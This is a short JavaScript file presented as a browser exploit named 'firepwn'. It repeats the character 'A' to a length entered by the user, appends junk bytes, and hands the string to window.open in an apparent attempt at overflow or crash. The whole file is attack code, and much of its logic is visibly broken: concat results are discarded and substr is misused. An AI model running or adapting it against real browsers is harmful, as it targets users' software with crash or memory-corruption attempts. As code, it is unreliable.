var STR="A";
var JST="";
var REP=parseInt(prompt("LR_SET"));

/*
Done with variable creation. 
Now let's write some functions! 
*/

function DO_REP(REP){
	i=0;
	while(i<REP){
		JST=JST+(STR); /* Concatenate 2 strings. */
		i++;
	};
	/* end loop */
	return JST;
};

function P0IS0N_ME(JST){
	/* 
	This takes an exploit string, does some crap and then points it to our exploit. 
	*/
	CORRECT=0;
	if (JST.length>=(REP-1)){
		/*
		Ensure it's long enough.
		*/
		/*
		Following concatenations are garbage strings. 
		*/
		JST.concat("\ufff9");
		JST.concat("\x03");
		JST.concat(JST.substr((Math.pow(2,10))*768),JST.length);
		CORRECT=1;
		/*
		Everything should've worked! 
		*/
	};
	if (CORRECT==1){
		window.open(JST); // Run exploit! 
	};
	return 0;
};
function PACK(REP){
	DO_REP(REP); // Repeat str. 
	P0IS0N_ME(JST); // Add grabage and run exploit.	
};
function firepwn(){
	PACK(REP);
};
